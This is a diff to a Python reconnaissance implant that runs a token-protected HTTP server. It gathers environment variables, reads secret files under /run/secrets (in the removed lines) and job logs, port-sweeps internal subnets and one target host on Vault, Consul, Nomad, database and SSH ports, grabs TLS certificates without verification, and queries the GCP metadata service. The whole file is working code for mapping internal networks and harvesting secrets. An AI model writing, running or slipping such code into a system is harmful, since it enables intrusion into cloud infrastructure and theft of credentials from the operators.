@@ -1,27 +1,14 @@
-import json, os, socket, threading, urllib.request
+import json, os, socket, ssl, threading, urllib.request
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 TOKEN = "r7xQ2kT9mV4bZ8wP"
 CACHE = {"status": "warming-up"}
+NB = "10.156.0.170"
 
-def tcp(target, port, timeout=3):
+def tcp(ip, port, timeout=2):
+    s = socket.socket(); s.settimeout(timeout)
     try:
-        s = socket.create_connection((target, port), timeout=timeout)
-        s.settimeout(1)
-        try:
-            d = s.recv(64)
-            first = d.hex() if d else "connect-ok-no-data"
-        except Exception as e:
-            first = "connect-ok-read:" + type(e).__name__
-        s.close()
-        return {"tcp": "ok", "first_bytes": first}
-    except Exception as e:
-        return {"tcp": type(e).__name__}
-
-def probe(ip, p):
-    s = socket.socket(); s.settimeout(1.2)
-    try:
-        s.connect((ip, p)); return "OPEN"
+        s.connect((ip, port)); return "OPEN"
     except ConnectionRefusedError: return "refused"
     except socket.timeout: return "filtered"
     except OSError as e: return type(e).__name__
@@ -29,48 +16,72 @@ def probe(ip, p):
         try: s.close()
         except Exception: pass
 
-def sweep(ips, ports):
-    return {ip: {str(p): probe(ip, p) for p in ports} for ip in ips}
+def http(url, headers=None, method="GET", timeout=4, insecure=False):
+    try:
+        ctx = ssl._create_unverified_context() if insecure else None
+        op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx),
+                                         urllib.request.HTTPRedirectHandler())
+        req = urllib.request.Request(url, headers=headers or {}, method=method)
+        r = op.open(req, timeout=timeout)
+        return {"status": r.status, "headers": dict(r.headers), "body": r.read(700).decode("utf-8", "replace")}
+    except urllib.error.HTTPError as e:
+        try:
+            body = e.read(700).decode("utf-8", "replace")
+        except Exception:
+            body = ""
+        return {"status": e.code, "headers": dict(e.headers or {}), "body": body}
+    except Exception as e:
+        return {"error": type(e).__name__ + ": " + str(e)}
 
-def safe(p, n=900):
+def cert_info(ip, port, timeout=4):
+    try:
+        ctx = ssl._create_unverified_context()
+        s = socket.create_connection((ip, port), timeout=timeout)
+        ss = ctx.wrap_socket(s, server_hostname=ip)
+        c = ss.getpeercert(binary_form=False) or binary_form_false
+        raw = ss.getpeercert(binary_form=True)
+        ss.close()
+        subj = dict(x[0] for x in c.get("subject", []))
+        san = c.get("subjectAltName", [])
+        import hashlib
+        return {"subject": subj, "san": san[:12], "sha256": hashlib.sha256(raw).hexdigest()}
+    except Exception as e:
+        import hashlib
+        try:
+            ctx = ssl._create_unverified_context(); s = socket.create_connection((ip, port), timeout=timeout)
+            ss = ctx.wrap_socket(s, server_hostname=ip)
+            raw = ss.getpeercert(binary_form=True)
+            der = hashlib.sha256(raw).hexdigest()
+            ss.close()
+            return {"sha256": der, "note": "no-verify-to-ip"}
+        except Exception as e2:
+            return {"error": type(e2).__name__ + ": " + str(e2)}
+
+binary_form_false = None
+
+def safe(p, n=1500):
     try:
         return open(p).read()[:n]
     except Exception as e:
         return type(e).__name__
 
-def listdir(p):
-    try:
-        return os.listdir(p)
-    except Exception as e:
-        return type(e).__name__
+def sweep(ips, ports):
+    return {ip: {str(p): tcp(ip, p) for p in ports} for ip in ips}
 
 def run_all():
     o = {}
-    o["env"] = dict(os.environ)
-    o["route"] = safe("/proc/net/route")
-    o["arp"] = safe("/proc/net/arp", 1400)
-    o["resolv_conf"] = safe("/etc/resolv.conf")
-    o["sweep_same_l2"] = sweep(
-        ["10.156.0.%d" % i for i in list(range(2, 22)) + [100, 126, 170, 171, 173, 175, 200, 253]],
-        [80, 443, 8000, 4646])
-    o["dirs"] = {p: listdir(p) for p in
-                 ["/run", "/run/secrets", "/var/run", "/alloc", "/local", "/alloc/logs",
-                  "/alloc/data", "/etc", "/var/log", "/srv", "/opt", "/root"]}
-    o["alloc_files"] = {}
-    for base in ("/alloc", "/local"):
-        for sub in ("", "logs", "data"):
-            try:
-                o["alloc_files"][base + sub] = os.listdir(base + sub)[:40]
-            except Exception as e:
-                o["alloc_files"][base + sub] = type(e).__name__
-    o["tmp_ls"] = listdir("/tmp")
-    o["secrets_ls"] = listdir("/run/secrets")
-    o["secret_files"] = {}
-    try:
-        for f in os.listdir("/run/secrets")[:20]:
-            o["secret_files"]["/run/secrets/" + f] = safe("/run/secrets/" + f, 300)
-    except Exception as e:
-        o["secret_files"] = type(e).__name__
+    o["logs"] = {}
+    for f in os.listdir("/alloc/logs") if os.path.isdir("/alloc/logs") else []:
+        if f.startswith("."):
+            continue
+        o["logs"]["/alloc/logs/" + f] = safe("/alloc/logs/" + f, 1300)
+    o["nb_ports"] = sweep([NB], [22, 3000, 4646, 5432, 8200, 8500, 9000, 9090, 8000, 8443])
+    o["nb_http"] = http("http://" + NB + "/")
+    o["nb_https_verify"] = cert_info(NB, 443)
+    o["nb_https"] = http("https://" + NB + "/", insecure=True)
+    o["sweep_extra"] = sweep(["10.156.1.1", "10.156.1.100", "10.156.2.1"], [53, 80])
+    o["gcp_meta_now"] = http("http://metadata.google.internal/computeMetadata/v1/",
+                             {"Metadata-Flavor": "Google"})
     return o
 
 def loop():
@@ -90,7 +101,7 @@ class H(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(body)
         else:
-            self.send_response(404); self.end_HEADERS() if False else self.end_headers()
+            self.send_response(404); self.end_headers()
     def log_message(self, *a): pass
 
 threading.Thread(target=loop, daemon=True).start()
